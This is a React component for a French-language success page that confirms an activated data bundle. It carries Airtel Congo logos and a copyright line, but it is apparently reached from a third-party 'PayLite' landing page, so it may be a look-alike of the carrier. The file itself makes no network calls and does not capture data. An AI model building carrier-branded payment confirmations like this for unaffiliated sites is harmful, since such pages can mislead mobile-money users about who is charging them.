import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';

// Interface for the selected bundle
interface Plan {
  data: string;
  price: string;
}

function AirtelLoanLimit() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [plan, setPlan] = useState<Plan>({ data: '1', price: '17190' });

  useEffect(() => {
    // 1. Get the phone number and format it
    const savedPhone = localStorage.getItem('airtelPhone') || '998886666';
    setPhone(savedPhone.replace('+243', '').replace('+', ''));

    // 2. Get the selected plan from the PayLite landing page
    const savedPlan = localStorage.getItem('selectedAirtelPlan');
    if (savedPlan) {
      try {
        const parsed = JSON.parse(savedPlan);
        setPlan({
          data: parsed.data || '1',
          price: parsed.price || '17190',
        });
      } catch (e) {
        console.error('Failed to parse selected plan');
      }
    }
  }, []);

  // ADDED: Clear data and navigate back to PayLite Landing page
  const handleReturnHome = () => {
    localStorage.removeItem('selectedAirtelPlan');
    localStorage.removeItem('airtelPhone');
    navigate('/');
  };

  return (
    <div className="airtel-success-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-success-container {
          min-height: 100vh;
          background: linear-gradient(180deg, #DA1C1C 0%, #8B0000 100%);
          display: flex;
          flex-direction: column;
          align-items: center;
          padding-bottom: 20px;
        }

        /* HEADER LOGO */
        .success-header {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-top: 40px;
          margin-bottom: 30px;
        }

        .tagline {
          font-size: 10px;
          letter-spacing: 1.5px;
          color: #ffffff;
          text-transform: uppercase;
          margin-top: 8px;
          font-weight: 500;
        }
        
        .tagline span {
          font-weight: 800;
        }

        /* SUCCESS CHECKMARK */
        .success-icon-wrapper {
          display: flex;
          align-items: center;
          justify-content: center;
          width: 140px;
          height: 140px;
          border-radius: 50%;
          background-color: rgba(255, 255, 255, 0.1); /* Outer glow */
          margin-bottom: 24px;
        }

        .success-icon-inner {
          display: flex;
          align-items: center;
          justify-content: center;
          width: 90px;
          height: 90px;
          border-radius: 50%;
          background-color: #FF3B3B;
          box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        /* TEXTS */
        .success-title {
          font-size: 28px;
          font-weight: 800;
          color: #ffffff;
          margin-bottom: 8px;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .success-phone {
          font-size: 32px;
          font-weight: 800;
          color: #ffffff;
          margin-bottom: 32px;
          letter-spacing: 1px;
        }

        /* RECEIPT CARD */
        .receipt-card {
          background-color: #ffffff;
          width: 90%;
          max-width: 420px;
          border-radius: 24px;
          padding: 24px;
          margin-bottom: 20px;
          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
        }

        .receipt-header {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 24px;
        }

        .signal-icon {
          width: 32px;
          height: 32px;
          background-color: #F5A623;
          border-radius: 8px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .receipt-title {
          font-size: 16px;
          font-weight: 800;
          color: #1a1a1a;
          text-transform: uppercase;
        }

        .receipt-data-amount {
          font-size: 56px;
          font-weight: 900;
          color: #DA1C1C;
          text-align: center;
          margin-bottom: 16px;
          display: flex;
          justify-content: center;
          align-items: baseline;
          gap: 8px;
          font-style: italic;
        }

        .receipt-data-amount span {
          font-size: 24px;
          font-weight: 700;
        }

        .receipt-description {
          text-align: center;
          color: #4B5563;
          font-size: 15px;
          line-height: 1.5;
          margin-bottom: 24px;
        }

        .receipt-divider {
          height: 1px;
          background-color: #E5E7EB;
          margin-bottom: 20px;
        }

        .receipt-row {
          display: flex;
          justify-content: space-between;
          margin-bottom: 16px;
          font-size: 15px;
        }

        .receipt-label {
          color: #6B7280;
          font-weight: 500;
          text-transform: uppercase;
        }

        .receipt-value {
          color: #1a1a1a;
          font-weight: 700;
        }

        .receipt-status {
          color: #16A34A;
          font-weight: 700;
        }

        /* WARNING BOX */
        .warning-box {
          background-color: rgba(0, 0, 0, 0.2); 
          width: 90%;
          max-width: 420px;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          gap: 12px;
          margin-bottom: 32px;
        }

        .warning-icon {
          font-size: 24px;
        }

        .warning-text {
          color: #ffffff;
          font-size: 14px;
          line-height: 1.6;
        }

        /* RETURN BUTTON */
        .return-btn {
          background-color: rgba(255, 255, 255, 0.15);
          border: 1px solid rgba(255, 255, 255, 0.3);
          color: #ffffff;
          padding: 16px 24px;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 700;
          display: flex;
          align-items: center;
          gap: 10px;
          cursor: pointer;
          transition: background-color 0.2s;
          margin-bottom: 32px;
        }

        .return-btn:active {
          background-color: rgba(255, 255, 255, 0.25);
        }

        /* FOOTER */
        .success-footer {
          color: rgba(255, 255, 255, 0.6);
          font-size: 12px;
          text-align: center;
          margin-top: auto;
        }
      `}</style>

      {/* HEADER LOGO */}
      <div className="success-header">
        <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#ffffff"/>
          <circle cx="25" cy="17" r="5" fill="#DA1C1C"/>
          <text x="46" y="29" fontSize="26" fontWeight="700" fill="#ffffff" letterSpacing="-0.5">airtel</text>
        </svg>
        <p className="tagline">A REASON TO <span>IMAGINE</span></p>
      </div>

      {/* SUCCESS ICON */}
      <div className="success-icon-wrapper">
        <div className="success-icon-inner">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ffffff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="20 6 9 17 4 12"></polyline>
          </svg>
        </div>
      </div>

      {/* TEXT */}
      <h1 className="success-title">
        🎉 Félicitations!
      </h1>
      <h2 className="success-phone">{phone}</h2>

      {/* RECEIPT CARD */}
      <div className="receipt-card">
        <div className="receipt-header">
          <div className="signal-icon">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="4" y="14" width="4" height="6" rx="1" fill="white"/>
              <rect x="10" y="9" width="4" height="11" rx="1" fill="white"/>
              <rect x="16" y="4" width="4" height="16" rx="1" fill="white"/>
            </svg>
          </div>
          <span className="receipt-title">FORFAIT ACTIVÉ</span>
        </div>

        <div className="receipt-data-amount">
          {plan.data} {plan.data !== '∞' && <span>GB</span>}
        </div>

        <p className="receipt-description">
          sera automatiquement crédité et ajouté à votre compte Airtel Money
        </p>

        <div className="receipt-divider"></div>

        <div className="receipt-row">
          <span className="receipt-label">MONTANT À DÉDUIRE</span>
          <span className="receipt-value">${plan.price}</span>
        </div>
        <div className="receipt-row">
          <span className="receipt-label">VALIDITÉ</span>
          <span className="receipt-value">—</span>
        </div>
        <div className="receipt-row" style={{ marginBottom: 0 }}>
          <span className="receipt-label">STATUT</span>
          <span className="receipt-status">✓ Actif</span>
        </div>
      </div>

      {/* WARNING BOX */}
      <div className="warning-box">
        <div className="warning-icon">📱</div>
        <div className="warning-text">
          Assurez-vous d'avoir suffisamment d'argent sur le compte pour l'achat. Vous recevrez un SMS de confirmation dans les prochaines minutes. Profitez de votre connexion internet! Si les fonds sont insuffisants, l'achat échouera automatiquement.
        </div>
      </div>

      {/* RETURN BUTTON (Now goes back to PayLite Landing Page) */}
      <button className="return-btn" onClick={handleReturnHome}>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
          <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
          <polyline points="9 22 9 12 15 12 15 22"></polyline>
        </svg>
        Retour à l'Accueil
      </button>

      {/* FOOTER */}
      <p className="success-footer">© 2026 Airtel Congo. Tous droits réservés.</p>
    </div>
  );
}

export default AirtelLoanLimit;